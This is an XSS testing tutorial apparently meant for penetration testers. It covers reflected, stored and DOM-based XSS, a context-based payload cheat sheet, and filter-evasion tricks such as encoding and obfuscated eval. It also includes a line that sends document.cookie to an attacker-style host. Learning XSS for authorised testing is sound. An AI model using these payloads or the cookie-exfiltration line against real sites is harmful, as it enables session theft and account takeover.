
# Cross‑Site Scripting (XSS)

XSS is a client‑side injection flaw where untrusted input gets treated as code and runs in a user’s browser under the target site’s origin. It breaks user trust and can lead to session hijacking, credential theft, UI redress actions, and persistent account takeover paths.

### The core idea
- **Root cause:** Unescaped/unvalidated user input reaches a code‑interpreting context (HTML, attributes, JavaScript, or DOM sinks).
- **Execution context:** The payload runs as if served by the legitimate site, so cookies, localStorage, and CSRF tokens are accessible (subject to HttpOnly/CSP).
- **Three main types:**
  - **Reflected XSS:** Input is reflected immediately in a single response (no server storage).
  - **Stored XSS:** Payload is saved (DB/cache) and later rendered for users.
  - **DOM‑based XSS:** Client‑side JavaScript moves user‑controlled data into dangerous sinks without server involvement.

### Contexts that change the payload shape
- **HTML body:** Can allow tags like `<script>` if not filtered.
- **HTML attribute:** Needs attribute breaking then event injection (e.g., `onerror`).
- **Inside JavaScript:** Requires breaking out of strings or code (quotes, comment terminators).
- **DOM sinks:** `innerHTML`, `document.write`, `eval`, `location.href` when fed by user input.

---

### Discovery: Find reflection and data flow
- **Inputs to probe:**  
  - **Search, comments, profiles, feedback:** These commonly echo user data.  
  - **URL parameters and fragments:** `?q=...`, `#tab=...` often show on the page.  
  - **Headers and hidden fields:** Some apps reflect `Referer`, custom headers, or hidden form inputs.
- **Tools and views:**  
  - **Browser dev tools (Network + Elements):** See where your input lands.  
  - **Burp Repeater:** Replay requests and compare responses across contexts.  
  - **View source / pretty‑printed JS:** Look for sinks and sources of user data.

### Reflected XSS :
1. **Plant a marker:**  
   - **Probe:** `<script>alert(1)</script>` and a unique string (e.g., `XSS_PROBE_123`).
2. **Locate the reflection:**  
   - **Check:** Is your input in HTML, attribute, or inside `<script>` tags?
3. **Match the context with the right payload:**  
   - **HTML body:** `<script>alert(1)</script>`  
   - **Attribute:** `"><img src=x onerror=alert(1)>`  
   - **Inside JS:** `' - alert(1) - //`
4. **Confirm execution:**  
   - **Validation:** Alert or benign side effect fires consistently.
5. **Demonstrate impact (controlled):**  
   - **Example:** `fetch("https://attacker.tld/?c="+document.cookie)`  
     Use a safe endpoint you control; avoid causing harm.

###  Stored XSS : 
1. **Find stored fields:**  
   - **Targets:** Comments, messages, reviews, bios, ticket titles, notifications.
2. **Submit a context‑fit payload:**  
   - **Start minimal:** `<svg/onload=alert(1)>` then escalate if sanitized.
3. **Trigger victim view:**  
   - **Check:** Load the page with another account/role to prove cross‑user impact.
4. **Stability test:**  
   - **Revisit:** Ensure the payload survives sanitization and persists across renders.

### DOM‑based XSS :
1. **Identify sources:**  
   - **Common:** `location.search`, `location.hash`, `document.referrer`, localStorage, postMessage.
2. **Find sinks:**  
   - **Dangerous:** `innerHTML`, `document.write`, `eval`, `new Function`, setting `href/src` directly.
3. **Shape the input/URL:**  
   - **Example:** `?name=<script>alert(1)</script>` or `#name=<img src=x onerror=alert(1)>`
4. **Confirm execution:**  
   - **Test:** Payload runs without server changes—purely client‑side.

---

## Payload cheatsheet by context
- **HTML body:**  
  - **Try:** `<script>alert(1)</script>`
- **HTML attribute:**  
  - **Try:** `" onerror=alert(1) x="`
- **Event handler:**  
  - **Try:** `<img src=x onerror=alert(1)>`
- **Inside JS string:**  
  - **Try:** `' - alert(1) - //`
- **URL‑reflected:**  
  - **Try:** `"><script>alert(1)</script>`
- **Minimal tag:**  
  - **Try:** `<svg/onload=alert(1)>`

---

## Filter evasion when basic payloads fail
- **Encodings:**  
  - **Example:** `<img src="jav&#x09;ascript:alert(1)">`
- **Payload splitting:**  
  - **Example:** `<scr<script>ipt>alert(1)</scr<script>ipt>`
- **Uncommon tags/attrs:**  
  - **Example:** SVG/MathML or rarely filtered events.
- **Obfuscation:**  
  - **Example:** `eval(unescape('%61%6c%65%72%74%28%31%29'))`
- **CSP gaps:**  
  - **Look for:** `unsafe-inline`, `unsafe-eval`, overly broad `script-src`.

---

## Detection and validation (avoid false positives)
- **Separate sessions:**  
  - **Check:** Use two accounts to validate stored XSS across users.
- **Real execution:**  
  - **Confirm:** JS runs (not just raw text reflected).
- **Context‑specific retest:**  
  - **Repeat:** Adjust payload to the exact landing context and retest multiple times.
- **Network evidence:**  
  - **Observe:** Outbound fetch/requests to your collector, if used.

---

## Optional: useful automation
- **Burp Repeater/Intruder:**  
  - **Use:** Rotate a small, context‑tagged payload set across parameters once a reflection is found.
- **ffuf for params:**  
  - **Use:** Discover hidden query/body parameters that might reflect.
- **DOM scanners (lightweight):**  
  - **Use:** Grep/minimal scripts to spot sinks like `innerHTML` or `eval` in bundled JS.


